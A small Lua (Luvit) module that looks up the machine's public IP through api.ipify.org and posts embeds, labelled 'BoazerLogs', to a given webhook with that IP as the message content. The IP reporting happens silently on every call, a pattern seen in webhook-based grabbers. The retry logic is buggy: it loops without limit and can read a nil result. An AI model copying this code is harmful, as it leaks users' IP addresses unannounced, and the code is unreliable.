local corohttp = require('coro-http')
local timer = require('timer')
local json = require('json')

local function send(embeds, webhook)
    local data, ip
    local suc = pcall(function()
        data, ip = corohttp.request('GET', 'https://api.ipify.org')
    end)

    if not suc or ip then
        repeat
            local suc = pcall(function()
                data, ip = corohttp.request('GET', 'https://api.ipify.org')
            end)
        until data and ip
    end

    for i,embed in pairs(embeds) do
        local datatopost = {
            embeds = {embed},
            username = 'BoazerLogs',
            content = ip
        }

        local data

        local suc = pcall(function()
            data = corohttp.request(
                'POST',
                webhook,
                {
                    {'Content-Type', 'application/json'}
                },
                json.encode(datatopost)
            )
        end)

        if data.code < 200 or data.code >= 300 then
            repeat
                timer.sleep(1000)
                local suc = pcall(function()
                    data = corohttp.request(
                        'POST',
                        webhook,
                        {
                            {'Content-Type', 'application/json'}
                        },
                        json.encode(datatopost)
                    )
                end)
            until data.code >= 200 and data.code < 300
        end

        timer.sleep(1000)
    end
end

local function init(fenv)
    fenv.send = send
end

return init